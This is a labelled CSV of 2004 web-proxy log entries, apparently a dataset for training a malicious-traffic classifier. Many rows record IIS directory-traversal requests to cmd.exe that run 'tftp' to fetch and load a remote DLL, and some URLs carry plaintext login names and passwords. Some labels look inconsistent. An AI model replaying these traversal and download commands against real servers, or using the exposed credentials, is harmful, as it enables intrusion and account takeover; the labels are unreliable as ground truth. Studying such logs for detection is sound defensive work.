,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
361,24.201.201.176,09/Mar/2004:23:23:52 -0500,http://www.acsearch.com/ ,200,10824,"""http://www.lln.com""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/,0,Microsoft Internet Explorer
362,24.201.201.176,09/Mar/2004:23:23:53 -0500,http://www.acsearch.com/index.php?q=RZBbbsMgEEW3UiGVT2cwxthEVndQqR9dgB8kJrHBBVynqbr3jkmlfvDQ4YiZO62S6jsoocjHqv0XOQbFSkWM/dQhztrGp5Nv12HnOeIlCVyRssqKKmNQ4qp3WCiiTyaJDJ/3E7VuJ4OCDEAKRJUia9DetrP+Mxl54H4y/XX1U8I11hpjXNThsG1bdm2tc8Oks97NhyTG0bv1PCJw08vigonG2UYCFDSaoelGe+6sdZ2zS2fs3F3sdL/4uw9+uPUUu2qwJUE1XhjFTUrIec4KmqbQ/Md/ziENgKayaAopa16DpO+vbw0AA1lVdV5yUdWSlyAEDev+f7EHwUnq22I8hjXqofKcw/HnFw== ,300,0,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/index.php,1,Microsoft Internet Explorer
363,24.201.201.176,09/Mar/2004:23:23:54 -0500,http://www.kanoodle.com/clickthrough.cool?position=7004&tid=bhngbnnobonpbinmbjnlzjrzrsrdxc&bid=0.05&eid=1&id=77023214&query=investment%20fraud&clickid=57793907&UNQ=00107889263589736055&subid=4 ,300,311,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),m,1,/clickthrough.cool,9,Microsoft Internet Explorer
364,24.201.201.176,09/Mar/2004:23:23:56 -0500,http://www.beamlaw.com/ ,200,6142,"""http://www.acsearch.com/""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/,0,Microsoft Internet Explorer
365,68.48.142.117,09/Mar/2004:23:24:00 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
366,68.48.142.117,09/Mar/2004:23:24:00 -0500,/c/httpodbc.dll ,400,282,"""-""",-,m,1,/c/httpodbc.dll,0,without browser
367,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
368,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
369,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
370,203.61.199.15,09/Mar/2004:23:24:15 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
371,203.61.199.15,09/Mar/2004:23:24:16 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
372,203.61.199.15,09/Mar/2004:23:24:17 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
373,203.61.199.15,09/Mar/2004:23:24:17 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
374,203.61.199.15,09/Mar/2004:23:24:19 -0500,http://www.bestobeast.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/members/,0,Microsoft Internet Explorer
375,217.136.205.206,09/Mar/2004:23:24:46 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://members.asstraffic.com:80""",Mozilla/4.0 ( compatible; [fr]; Windows 95; Compaq ),n,0,/secure/pages/index.php,0,without browser
376,68.48.142.117,09/Mar/2004:23:24:50 -0500,/d/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
377,192.117.242.67,09/Mar/2004:23:25:37 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
378,192.117.242.67,09/Mar/2004:23:25:39 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
379,68.48.142.117,09/Mar/2004:23:25:40 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
380,24.201.201.176,09/Mar/2004:23:25:46 -0500,http://www.ropile.com/ ,200,10007,"""http://www.bannercell.com""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),n,0,/,0,Microsoft Internet Explorer
381,24.201.201.176,09/Mar/2004:23:25:52 -0500,http://www.ropile.com/index.php?q=NVDbboQgFPwXkvKGy00FNqTpyyZ9aNJfAGVbo6tUsW7T9N970DYBMswcDnPGGWW+FyMMWroWnRdTGyR0KZmq8q006GMN81fGUOPXHXGDupgBA65ShVQFoxVsnUlpULgezaCQ6f+3mWoNLShlJVDKoHUJ8+hu4e+npzFNIzqkZuiafp2HvQuDPu8pRXM6fbpdKULshikVzXQ7HYRb4v2xt+AQeysoxdEeNXix8wQo4DgtVuBkucR911rPK12KuiVCtJpIxzlxXHviFVdBO39tmhKHaDmGaGwQtQ8tFUTLqiJSeUo0rUvC4QwMREEbPNjd5gO/wNq2rXgeE4wY0oub+5CKaX7LmriE12wtD1dBWvfYzRBCZxitldJCSHH++QU= ,300,0,"""http://www.ropile.com/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),m,1,/index.php,1,Microsoft Internet Explorer
382,24.201.201.176,09/Mar/2004:23:25:52 -0500,http://vaclick.epilot.com/click.aspx?k=buy&b=300&p=epilot&s=ropile&pos=3&t=24&kid=b269537d-33d9-4a22-a29b-b828e9abfcc5&ep=2&sid=e37bed03-9466-48b0-9075-2907e137b30c&l=http:%2F%2Fwww.InternetMarket.org%2F%3FePilot ,300,281,"""http://www.ropile.com/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),m,1,/click.aspx,10,Microsoft Internet Explorer
383,24.201.201.176,09/Mar/2004:23:25:54 -0500,http://www.internetmarket.org/?ePilot ,200,55506,"""http://www.ropile.com/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),n,0,/,0,Microsoft Internet Explorer
384,68.48.142.117,09/Mar/2004:23:26:31 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
385,212.160.132.1,09/Mar/2004:23:27:13 -0500,http://140.99.44.61/cgi-bin/jenv.cgi ,200,965,"""-""",fork(),n,0,/cgi-bin/jenv.cgi,0,without browser
386,212.160.132.1,09/Mar/2004:23:27:14 -0500,www.microsoft.com:80 ,200,0,"""-""",-,n,0,www.microsoft.com:80,0,without browser
387,68.48.142.117,09/Mar/2004:23:27:21 -0500,/d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/d/winnt/system32/cmd.exe,0,without browser
388,68.48.142.117,09/Mar/2004:23:27:21 -0500,/d/httpodbc.dll ,400,282,"""-""",-,m,1,/d/httpodbc.dll,0,without browser
389,80.54.146.135,09/Mar/2004:23:27:32 -0500,http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer ,200,21657,"""http://strony.wp.pl/wp/secury/""",Mozilla/4.5 [en-us] (WinNT; I),n,0,/affiliates/result.php,2,without browser
390,80.54.146.135,09/Mar/2004:23:27:34 -0500,http://www.cybermoo.com/affiliates/click.php?argx=c139ae8a2a33b6c0f1a8dc6f56aaa44ee47cd8eb25f1be578cb2c77b611845b1062fbcb0d42feefc62fb7af11e90390964b25748b6aee2e87640fff7f04b4ca36762c680d8326ab05d440b600605ecde857e6d4e678899c933c4429106c87db41d250ef70aca9a1c09174321c03d9779deb87757b8899b963bbba5139eb151841f500bd0de0e038212f29fef61cf07b5436c7fe65d93037dee3a72c81b6349533c5b5370a35ffa1f7e2b13e884bb81615a233e6b57d2134856402d6c930e2a1ecaad66a7c9ec998929d3b0c1a9ba2534f8ff4e24ff7637b2ad28b8bf1ab72dab34eaaf45da5eadc6c222e4bfa55b84356ab76b9cb3373cc71fb8e7f0002fac707ec4709fc24c4be33297c969cd9582c9c721cfc34af5450700a83886c92c47c5f66c99700847ac91e128ea9fc1f65663272e02c612e31ce5127a09b90c1cfb755f1f3993ca08c8c6aa8277550abb7f5537b3f7da0feeb284d5013fdc00a3df0e0b7a25ac91921988e336bc51a06f27d531048d839a4b36d62c5eff11952c4cda4c630caaeea6d99dff52d22e696ab202c1d05f5aced375b61f0ce5f8810c54167d223091af12f171648492c2da580ae4d981a89aaab06fe7559ed78831953900cb8d85e6e29775dba9652960869d709bf6805a1d8c7af714d45656a3e4dc1983 ,300,332,"""http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer""",Mozilla/4.5 [en-us] (WinNT; I),m,1,/affiliates/click.php,1,without browser
391,80.54.146.135,09/Mar/2004:23:27:35 -0500,http://www.epilot.com/click.aspx?k=digital%20camera%20printer&b=320&p=kanoodle&s=cybermoo&pos=2&sid=9bef258d-4ab1-48ca-83c9-810362d6f41e&l=http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer ,300,402,"""http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer""",Mozilla/4.5 [en-us] (WinNT; I),n,0,/click.aspx,11,without browser
392,80.54.146.135,09/Mar/2004:23:27:36 -0500,http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer ,300,352,"""http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer""",Mozilla/4.5 [en-us] (WinNT; I),n,0,/clickthrough.cool,5,without browser
393,80.54.146.135,09/Mar/2004:23:27:36 -0500,http://www1.ritzcamera.com/?location=KNR318&cat=5739564&tmlpse=true ,200,1588,"""http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer""",Mozilla/4.5 [en-us] (WinNT; I),n,0,/,3,without browser
394,203.121.182.139,09/Mar/2004:23:28:10 -0500,200.248.220.242:25 ,200,0,"""-""",-,n,0,200.248.220.242:25,0,without browser
395,68.48.142.117,09/Mar/2004:23:28:11 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
396,192.117.242.67,09/Mar/2004:23:28:21 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
397,68.48.142.117,09/Mar/2004:23:29:04 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
398,61.172.244.112,09/Mar/2004:23:29:44 -0500,209.15.20.86:25 ,200,0,"""-""",-,n,0,209.15.20.86:25,0,without browser
399,68.48.142.117,09/Mar/2004:23:29:54 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
400,218.78.209.42,09/Mar/2004:23:30:44 -0500,168.226.152.46:25 ,500,434,"""-""",-,n,0,168.226.152.46:25,0,without browser
401,68.48.142.117,09/Mar/2004:23:30:45 -0500,/scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../winnt/system32/cmd.exe,0,without browser
402,192.117.242.67,09/Mar/2004:23:30:48 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
403,192.117.242.67,09/Mar/2004:23:30:54 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
404,24.168.72.174,09/Mar/2004:23:31:21 -0500,http://edit.korea.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus1872&passwd=satan ,200,566,"""-""",-,n,0,/config/login,8,without browser
405,68.48.142.117,09/Mar/2004:23:31:35 -0500,/scripts/..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%255c../httpodbc.dll,0,without browser
406,218.29.56.234,09/Mar/2004:23:31:43 -0500,http://www.tosearchit.com/?id=356&q=gambling ,200,311,"""http://mujweb.cz/www/luckmos/affprogram.htm""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/,2,Microsoft Internet Explorer
407,217.136.205.206,09/Mar/2004:23:31:58 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://members.asstraffic.com:80""",Mozilla/3.01 ( compatible; MSIE 4.0; Windows 95; DigiExt ),n,0,/secure/pages/index.php,0,Microsoft Internet Explorer
408,203.121.182.142,09/Mar/2004:23:32:01 -0500,221.147.5.145:25 ,200,0,"""-""",-,n,0,221.147.5.145:25,0,without browser
409,220.173.17.142,09/Mar/2004:23:32:13 -0500,http://www.canada44.ca/ ,200,27095,"""http://www.so123.com""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/,0,Microsoft Internet Explorer
410,220.173.17.142,09/Mar/2004:23:32:15 -0500,http://www.canada44.ca/index.php?q=LZLbjqJAEIZfZcMtiYKcmp5MNjqCwyggnuXGNNBCIzTQIKCbfffFmb3oVNVff32ppBpBAP/UUIJcTSLurYYq5GRZA7r8KhTIVXfMHq9cBJCzaIMZxc0vG7EbbgiNX50J5Ej5bRkwKhjJYCQK6vD0lyhDDl9/2CLkpFccbMFLiaAwEgRJUwZtoN/rAY5y/G0dxi5zw5zuV7vLfmtsLtyPKcxIeLuz7BstDNsmTVPC8bjruhEKa4xYmIzCIh+XiDUUs3GfZxeKu1GZlL+r9/VhFgS1HRurfpkcPJ6Gp7OSmH67X2TX1pu6y3Nfe/a9pytU0Wsrp4F+XMxo0kwi58AKJpxOOXu0DlU9WV36or1T/KUrqdis5JzsAH+1MyO17/KGCTUht/g4n92crHZWRssyXlE+XQdUarr20Ec821jyzhS7A8vVOmt5+oUdN6hYRW/Pu4OU58St2MY3klIsrvMml0z02Vnj43a112Ic5QY6Z+l62n0luGRzubRWbbKfEhKcGl2Kn4okFV7Da0ThH+uFIh2foUy7p2lFLAyW6Ei7jhRhsX2ofuASPm0Rn4BwO06jmQ5Qwc4H72QtYgZAu/KmcwudSOo6krycVls/FKP+w/afTtFHSm7qC0mQdLLfBZ9aD97/fyXcl4QNByVQFDQAdEmbaG9//wE= ,300,695,"""http://www.canada44.ca/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),m,1,/index.php,1,Microsoft Internet Explorer
411,220.173.17.142,09/Mar/2004:23:32:15 -0500,http://www.acsearch.com/partner/xml_new.php?q=PVBbbsMgELxKhVQ+ncXY5hFZvUGlfvQAOKYxsQMuxnLaqnfv4jb9WGBnht2dNVror0XXmryvNn6Q46KZ1MT5ZKO36eFq4miT8+fMlEjMu4Rr0siikgWDBkNlsNLEvrl+55HON8q6jPQaCgBRI4TF1wVrm6slv+nJeNObqrqnkzuNa5z2OqrRZEhp1ofDtm3FaHwI/WSLU7gedmEaYljPAwJheprD4pILvhUAiibXt93gz533oQt+7i5+yPG53Wzc4nwzFIdrcbKaWnwwiocoSy6ZbOi+jva+h8cS/jdB98aorYVQXIGgr88vLQADIaXijON34KAqSZc1dxCMZzNoxd5mF9G3039iUTbH7x8= ,300,0,"""http://www.canada44.ca/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),m,1,/partner/xml_new.php,1,Microsoft Internet Explorer
412,220.173.17.142,09/Mar/2004:23:32:16 -0500,http://www.kanoodle.com/clickthrough.cool?position=7009&tid=bhngbnnobonpbjnhbjnhzwxerwrpxa&bid=0.05&eid=1&id=72238186&query=internet%20marketing&clickid=57793907&UNQ=00107889313186030948&subid=713 ,300,343,"""http://www.canada44.ca/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/clickthrough.cool,9,Microsoft Internet Explorer
413,220.173.17.142,09/Mar/2004:23:32:17 -0500,http://www.commerce-database.com/internetmarketing.htm ,200,9065,"""http://www.canada44.ca/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 95),n,0,/internetmarketing.htm,0,Microsoft Internet Explorer
414,68.48.142.117,09/Mar/2004:23:32:28 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
415,203.121.182.141,09/Mar/2004:23:32:57 -0500,195.214.161.18:25 ,200,0,"""-""",-,n,0,195.214.161.18:25,0,without browser
416,217.16.31.38,09/Mar/2004:23:33:01 -0500,http://www.ya.ru/ ,200,1346,"""http://www.ya.ru/""",Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en],n,0,/,0,Opera
417,217.16.31.38,09/Mar/2004:23:33:13 -0500,https://www.chel.mts.ru/sms/cgi-bin/cgi_.exe?function=sms_send ,200,23501,"""http://www.ya.ru/""",Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.03  [en],n,0,/sms/cgi-bin/cgi_.exe,1,Opera
418,203.121.182.189,09/Mar/2004:23:33:16 -0500,210.242.13.88:25 ,200,0,"""-""",-,n,0,210.242.13.88:25,0,without browser
419,68.48.142.117,09/Mar/2004:23:33:18 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
420,203.121.182.144,09/Mar/2004:23:33:28 -0500,210.210.11.103:25 ,200,0,"""-""",-,n,0,210.210.11.103:25,0,without browser
421,192.117.242.67,09/Mar/2004:23:33:34 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
422,61.172.244.216,09/Mar/2004:23:34:04 -0500,212.118.1.226:25 ,200,0,"""-""",-,n,0,212.118.1.226:25,0,without browser
423,68.48.142.117,09/Mar/2004:23:34:08 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
424,68.48.142.117,09/Mar/2004:23:34:59 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
425,68.48.142.117,09/Mar/2004:23:35:52 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
426,192.117.242.67,09/Mar/2004:23:36:05 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
427,192.117.242.67,09/Mar/2004:23:36:13 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
428,68.48.142.117,09/Mar/2004:23:36:42 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
429,68.48.142.117,09/Mar/2004:23:37:32 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
430,203.121.182.139,09/Mar/2004:23:37:39 -0500,209.15.20.140:25 ,200,0,"""-""",-,n,0,209.15.20.140:25,0,without browser
431,68.48.142.117,09/Mar/2004:23:38:23 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
432,24.201.201.176,09/Mar/2004:23:38:24 -0500,http://3000search.com/search.php?ID=15862&fString=miami+beach+hotel ,300,5,"""http://3000search.com/?ID=16602""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
433,24.201.201.176,09/Mar/2004:23:38:25 -0500,http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel ,200,16321,"""http://3000search.com/?ID=16602""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
434,24.201.201.176,09/Mar/2004:23:38:26 -0500,http://3000search.com/redirect.php?fID=163480912 ,300,5,"""http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
435,24.201.201.176,09/Mar/2004:23:38:27 -0500,http://click.search123.com/cgi-bin/clickthru.cgi?EI=62793&Q=miami%20beach%20hotel&NGT=CV330kGVYHYwPOO4+Jc9eOfsNfajcy3xxMqrRoDsq6XneYinFCEPqAwd+OOfHjTODY2dOWLmD5x75g8W/In0+/E04NMHuEF0tjOWE0bz2m9DFG+4VwKJotFVlYTgvxMiIucfLR7lKt/ktpzgS8U3KVo0qq+nHpHvyU3uNPJ6oI328xZBN1eTQZQIsLIG5sxIfXjpRYk/L75cO1mHuWiHFUkT3Or0MZMLZS3thzhz4700kksW73c0E5dFOUJDZlQMizMym5qIJDexH2eb88jzh21Ss2c5kp3FNsX/sutQ/NL0CSiDTPlkQ0eV+IdosHkTy+gaEwpcwu09ymkSzn+TNJkLaIsMIraAN0bpOGoy0fo62iai+ueLbJWcnDTeC0ZcmzZuyRzyDk0NRkmvubcg3eHBoNjV5zEqV8Cldm5gbdhKZxCSsDRFcZ3dvhs0fX+C950w/jax+Rk=&x=1&UID=15862&IP=192.168.1.103 ,300,525,"""http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/cgi-bin/clickthru.cgi,6,Microsoft Internet Explorer
436,24.201.201.176,09/Mar/2004:23:38:28 -0500,http://c.ah-ha.com/c?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 ,300,0,"""http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/c,3,Microsoft Internet Explorer
437,24.201.201.176,09/Mar/2004:23:38:28 -0500,http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLCgHokTmxDEKERyVaopdp2W0lRYtQxlE43VypL1pPVj5M4v2KCGhI5TQebOV4skUAQw4Qq4JZIeEEEcma3iQpKbdTizcXlCmlYq2KFjpz3i1RPwbRLHTrIWkMOjfpCSgrWcFqhsXtPAAjEhrSdRn0kiqmXX0PEPyf12uDFT4AJnuWeYm1OhdLzTwYzOI2WuWGAzfiYTDAPPud0cgpm33eZbmnaIkFeJdhnvnOwOjAHYponPl3bRh3nOJt5UXdQRmvLoFnZcJigXuqMAHEUe&h=pKKOOBMIZbBbImCH3&b=29269 ,300,0,"""http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/c/2,3,Microsoft Internet Explorer
438,24.201.201.176,09/Mar/2004:23:38:29 -0500,http://www.smartpages.com/index.jhtml?From=ah-ha.com ,200,8272,"""http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.jhtml,1,Microsoft Internet Explorer
439,192.117.242.67,09/Mar/2004:23:38:56 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
440,66.36.242.145,09/Mar/2004:23:39:01 -0500,http://atomintersoft.info/ap/env/1/ ,200,797,"""-""",Mozilla/4.0 (compatible; MSIE 5.0; Windows NT),n,0,/ap/env/1/,0,Microsoft Internet Explorer
441,68.48.142.117,09/Mar/2004:23:39:13 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
442,66.36.242.145,09/Mar/2004:23:39:26 -0500,http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.44.102.129&stripheader=1&quiet=1 ,200,3871,"""-""",-,n,0,/cgi-bin/whois.cgi,3,without browser
443,66.36.242.145,09/Mar/2004:23:39:30 -0500,http://www.webconnections.net/cgi-bin/whois.cgi?domain=217.44.102.129&stripheader=1&quiet=1 ,200,3871,"""-""",-,n,0,/cgi-bin/whois.cgi,3,without browser
444,24.168.72.174,09/Mar/2004:23:39:49 -0500,http://edit.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exoduscold&passwd=SATAN ,200,566,"""-""",-,n,0,/config/login,8,without browser
445,68.48.142.117,09/Mar/2004:23:40:03 -0500,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
